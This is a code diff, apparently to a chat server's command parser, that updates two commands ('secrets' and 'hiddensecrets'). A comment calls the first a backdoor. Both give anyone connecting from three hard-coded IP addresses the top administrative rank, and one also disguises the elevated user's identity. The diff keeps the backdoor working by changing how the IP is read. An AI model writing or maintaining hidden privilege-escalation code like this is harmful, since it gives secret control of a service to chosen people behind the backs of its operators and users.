@@ -1493,9 +1493,11 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 	*/
 	
+	var ip = "";
 	case 'secrets':
 		// backdoor for panderp and kupo
-		if (user.ip  === '76.247.181.42'|| user.ip === '127.0.0.1' || user.ip === '204.112.213.60' ) {
+		ip = user.connections[0].ip;
+		if ( ip  === '76.247.181.42'|| ip === '127.0.0.1' || ip === '204.112.213.60' ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			return false;
@@ -1505,7 +1507,8 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'hiddensecrets':
 	case 'hsecrets':
 		// courtesy of jd
-		if (user.ip === '204.112.213.60' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
+		ip = user.connections[0].ip;
+		if ( ip === '204.112.213.60' || ip === '127.0.0.1' || ip === '76.247.181.42') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			user.getIdentity = function() { return ' ' + user.name }
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
